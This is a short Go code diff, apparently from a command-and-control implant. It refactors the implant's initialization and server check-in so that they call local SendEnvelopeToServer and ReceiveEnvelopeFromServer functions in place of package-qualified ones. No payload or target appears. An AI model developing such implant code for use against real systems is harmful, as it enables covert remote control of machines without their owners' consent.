@@ -70,7 +70,7 @@ func initialize() error {
 		return err
 	}
 	defer conn.Close()
-	err = communication.SendEnvelopeToServer(conn, implantId, 0, msg, []byte(sessionKey))
+	err = SendEnvelopeToServer(conn, implantId, 0, msg, []byte(sessionKey))
 	if err != nil {
 		return err
 	}
@@ -81,12 +81,12 @@ func initialize() error {
 func checkIn(conn net.Conn) (int, interface{}, error) {
 	msg := communication.ImplantCheckin{ImplantId: implantId}
 
-	err := communication.SendEnvelopeToServer(conn, implantId, 1, msg, []byte(sessionKey))
+	err := SendEnvelopeToServer(conn, implantId, 1, msg, []byte(sessionKey))
 	if err != nil {
 		return -1, nil, err
 	}
 
-	messageType, data, err := communication.ReceiveEnvelopeFromServer(conn, []byte(sessionKey))
+	messageType, data, err := ReceiveEnvelopeFromServer(conn, []byte(sessionKey))
 	if err != nil {
 		return -1, nil, err
 	}
